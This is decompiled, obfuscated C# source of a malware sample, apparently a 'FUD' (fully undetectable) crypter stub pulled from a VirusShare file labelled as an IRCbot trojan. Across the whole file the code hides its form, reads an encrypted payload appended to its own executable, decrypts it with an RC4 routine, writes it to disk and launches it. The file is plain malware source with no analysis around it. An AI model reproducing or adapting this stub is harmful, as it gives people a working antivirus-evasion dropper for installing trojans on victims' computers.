// Decompiled with JetBrains decompiler
// Type: .
// Assembly: FUD Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CA57510E-1F7B-47BB-998D-F04D6C18C0A3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Jorik.IRCbot.bsa-c63f7b3292b3493d25c8dac953eb4faaef86b9c05ed9d1077709ee2f61120924.exe

using \u0001;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace \u0006
{
  internal sealed class \u0006 : Form
  {
    private IContainer \u0001;

    [DebuggerNonUserCode]
    public \u0006()
    {
      try
      {
        \u0084\u0005 obj1 = \u0084\u0005.\u0010\u0008;
        \u0006.\u0006 obj2 = this;
        // ISSUE: virtual method pointer
        EventHandler eventHandler = new EventHandler((object) obj2, __vmethodptr(obj2, \u0003));
        obj1((object) this, eventHandler);
        this.\u0003();
      }
      catch (Exception ex)
      {
        throw UnhandledException.\u0003(ex, (object) this);
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose([In] bool obj0)
    {
      try
      {
        try
        {
          if (!obj0 || this.\u0001 == null)
            return;
          \u009E\u0003.\u007E\u0013\u0002((object) this.\u0001);
        }
        finally
        {
          \u008A\u0005.\u0012\u0008((object) this, obj0);
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) obj0;
        throw UnhandledException.\u0003(ex, (object) this, (object) local);
      }
    }

    private void \u0003()
    {
      SizeF sizeF1;
      Size size1;
      ComponentResourceManager componentResourceManager1;
      try
      {
        // ISSUE: type reference
        componentResourceManager1 = new ComponentResourceManager(\u0080\u0003.\u009C\u0003(__typeref (\u0006.\u0006)));
        \u009E\u0003.\u007E\u008B\u0007((object) this);
        \u0006\u0004 obj1 = \u0006\u0004.\u007E\u008F\u0007;
        sizeF1 = new SizeF(6f, 13f);
        SizeF sizeF2 = sizeF1;
        obj1((object) this, sizeF2);
        \u0003\u0003.\u007E\u0090\u0007((object) this, AutoScaleMode.Font);
        \u0081\u0005 obj2 = \u0081\u0005.\u007E\u009D\u0007;
        size1 = new Size(292, 266);
        Size size2 = size1;
        obj2((object) this, size2);
        \u008F\u0004.\u007E\u009E\u0006((object) this, \u000E\u0004.\u0096\u0007());
        \u0083\u0005.\u007E\u0006\u0007((object) this, \u008E\u0004.\u0004\u000E());
        \u0005\u0003.\u007E\u009B\u0007((object) this, FormBorderStyle.FixedToolWindow);
        \u0093\u0003.\u007E\u009F\u0007((object) this, (Icon) \u0087\u0002.\u007E\u0092\u0005((object) componentResourceManager1, \u0004.\u0003(5987)));
        \u008A\u0005.\u007E\u0001\u0008((object) this, false);
        \u0096\u0005.\u007E\u0011\u0007((object) this, \u0004.\u0003(6004));
        \u0086\u0003.\u007E\u0003\u0008((object) this, 0.0);
        \u008A\u0005.\u007E\u0005\u0008((object) this, false);
        \u008A\u0005.\u007E\u0004\u0008((object) this, false);
        \u0096\u0005.\u007E\u0008\u0008((object) this, \u0004.\u0003(6013));
        \u000E\u0003.\u007E\u000F\u0008((object) this, FormWindowState.Minimized);
        \u008A\u0005.\u007E\u0087\u0007((object) this, false);
      }
      catch (Exception ex)
      {
        ComponentResourceManager componentResourceManager2 = componentResourceManager1;
        // ISSUE: variable of a boxed type
        __Boxed<SizeF> local1 = (ValueType) sizeF1;
        // ISSUE: variable of a boxed type
        __Boxed<Size> local2 = (ValueType) size1;
        throw UnhandledException.\u0003(ex, (object) componentResourceManager2, (object) local1, (object) local2, (object) this);
      }
    }

    private void \u0003([In] object obj0, [In] EventArgs obj1)
    {
label_0:
      string str1;
      int num1;
      int[] numArray;
      string[] strArray;
      string str2;
      string str3;
      int num2;
      int num3;
      try
      {
        try
        {
          \u0012\u0003.\u0081();
          num3 = -2;
label_1:
          num1 = 2;
          str3 = \u0083\u0003.\u0012\u0006();
label_2:
          num1 = 3;
          \u0093\u0005.\u001A(1, \u0083\u0003.\u0092\u0006(), OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
label_3:
          num1 = 4;
          str1 = \u0097\u0005.\u0087(checked ((int) \u009C\u0002.\u001E(1)));
label_4:
          num1 = 5;
          \u009F\u0003.\u001C(1, ref str1, -1L, false);
label_5:
          num1 = 6;
          numArray = new int[1]{ 1 };
          \u0013\u0005.\u001B(numArray);
label_6:
          num1 = 7;
          strArray = \u0094\u0002.\u0088(str1, \u0004.\u0003(6026), -1, CompareMethod.Binary);
label_7:
          num1 = 8;
          str2 = \u0006.\u0006.\u0003(strArray[1], \u0004.\u0003(6059));
label_8:
          num1 = 9;
          \u0093\u0005.\u001A(5, \u009A\u0002.\u0089\u0002(str3, \u0004.\u0003(6092)), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default, -1);
label_9:
          num1 = 10;
          \u0015\u0005.\u001D(5, str2, -1L, false);
label_10:
          num1 = 11;
          numArray = new int[1]{ 5 };
          \u0013\u0005.\u001B(numArray);
label_11:
          num1 = 12;
          Process process = \u001D\u0003.\u009E\u0008(\u009A\u0002.\u0089\u0002(str3, \u0004.\u0003(6092)));
label_12:
          num1 = 13;
          \u009E\u0003.\u007E\u0011\u0008((object) this);
          \u0012\u0003.\u0082();
          goto label_18;
label_14:
          num2 = num1;
          switch (num3 > -2 ? num3 : 1)
          {
            case 1:
              int num4 = num2 + 1;
              num2 = 0;
              switch (num4)
              {
                case 1:
                  goto label_0;
                case 2:
                  goto label_1;
                case 3:
                  goto label_2;
                case 4:
                  goto label_3;
                case 5:
                  goto label_4;
                case 6:
                  goto label_5;
                case 7:
                  goto label_6;
                case 8:
                  goto label_7;
                case 9:
                  goto label_8;
                case 10:
                  goto label_9;
                case 11:
                  goto label_10;
                case 12:
                  goto label_11;
                case 13:
                  goto label_12;
                case 14:
                  goto label_18;
              }
              break;
          }
        }
        catch (Exception ex) when (ex is Exception & num3 != 0 & num2 == 0)
        {
          ProjectData.SetProjectError(ex);
          goto label_14;
        }
        throw \u0002\u0004.\u007F(-2146828237);
label_18:
        if (num2 == 0)
          return;
        \u0012\u0003.\u0081();
      }
      catch (Exception ex)
      {
        object[] objArray = new object[11]
        {
          (object) str1,
          (object) str2,
          (object) strArray,
          (object) str3,
          (object) numArray,
          (object) num3,
          (object) num2,
          (object) num1,
          (object) this,
          obj0,
          (object) obj1
        };
        throw UnhandledException.\u0003(ex, objArray);
      }
    }

    public static string \u0003([In] string obj0, [In] string obj1)
    {
      int num1;
      int index1;
      char ch1;
      int[] numArray1;
      int[] numArray2;
      int index2;
      int index3;
      int num2;
      int num3;
      int index4;
      int index5;
      int num4;
      char ch2;
      int num5;
      StringBuilder stringBuilder1;
      string str1;
      try
      {
        index4 = 0;
        index5 = 0;
        stringBuilder1 = new StringBuilder();
        str1 = string.Empty;
        numArray2 = new int[257];
        numArray1 = new int[257];
        num1 = \u0016\u0005.\u007E\u0019\u0002((object) obj1);
        index1 = 0;
        while (index1 <= (int) byte.MaxValue)
        {
          ch1 = \u0001\u0003.\u007E\u0018\u0002((object) \u0080\u0004.\u007E\u001C\u0002((object) obj1, index1 % num1, 1))[0];
          numArray1[index1] = \u001B\u0003.\u0084(ch1);
          numArray2[index1] = index1;
          int num6 = \u008C\u0005.\u0093\u0003(\u009A\u0004.\u007F\u0004(ref index1), checked (index1 - 1));
        }
        index2 = 0;
        index3 = 0;
        while (index3 <= (int) byte.MaxValue)
        {
          index2 = checked (index2 + numArray2[index3] + numArray1[index3]) % 256;
          num2 = numArray2[index3];
          numArray2[index3] = numArray2[index2];
          numArray2[index2] = num2;
          int num7 = \u008C\u0005.\u0093\u0003(\u009A\u0004.\u007F\u0004(ref index3), checked (index3 - 1));
        }
        index1 = 1;
        while (index1 <= \u0016\u0005.\u007E\u0019\u0002((object) obj0))
        {
          num3 = 0;
          index4 = checked (index4 + 1) % 256;
          index5 = checked (index5 + numArray2[index4]) % 256;
          num3 = numArray2[index4];
          numArray2[index4] = numArray2[index5];
          numArray2[index5] = num3;
          num4 = numArray2[checked (numArray2[index4] + numArray2[index5]) % 256];
          ch2 = \u0001\u0003.\u007E\u0018\u0002((object) \u0080\u0004.\u007E\u001C\u0002((object) obj0, checked (index1 - 1), 1))[0];
          num3 = \u001B\u0003.\u0084(ch2);
          num5 = num3 ^ num4;
          StringBuilder stringBuilder2 = \u0008\u0005.\u007E\u0091\u0002((object) stringBuilder1, \u001B\u0004.\u0086(num5));
          int num8 = \u008C\u0005.\u0093\u0003(\u009A\u0004.\u007F\u0004(ref index1), checked (index1 - 1));
        }
        str1 = \u007F\u0004.\u007E\u008E\u0002((object) stringBuilder1);
        \u0089\u0003.\u007E\u008F\u0002((object) stringBuilder1, 0);
        return str1;
      }
      catch (Exception ex)
      {
        string str2;
        object[] objArray = new object[19]
        {
          (object) index1,
          (object) index3,
          (object) stringBuilder1,
          (object) index4,
          (object) num1,
          (object) index5,
          (object) numArray1,
          (object) str2,
          (object) str1,
          (object) numArray2,
          (object) index2,
          (object) ch1,
          (object) num2,
          (object) num5,
          (object) ch2,
          (object) num3,
          (object) num4,
          (object) obj0,
          (object) obj1
        };
        throw UnhandledException.\u0003(ex, objArray);
      }
    }
  }
}
